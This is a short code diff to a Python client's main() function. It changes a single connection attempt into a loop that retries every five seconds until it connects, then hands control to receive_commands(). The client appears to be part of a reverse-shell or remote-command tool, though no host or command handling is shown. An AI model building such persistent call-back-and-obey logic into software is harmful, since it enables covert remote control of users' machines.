@@ -228,13 +228,12 @@ def main():
     client = Client()
     client.socket_create()
     while True:
-        #try:
-        client.socket_connect()
-        break
-        #except:
-        #    time.sleep(5)
-        #else:
-        #    break
+        try:
+            client.socket_connect()
+        except:
+            time.sleep(5)
+        else:
+            break
     try:
         client.receive_commands()
     except Exception as e:
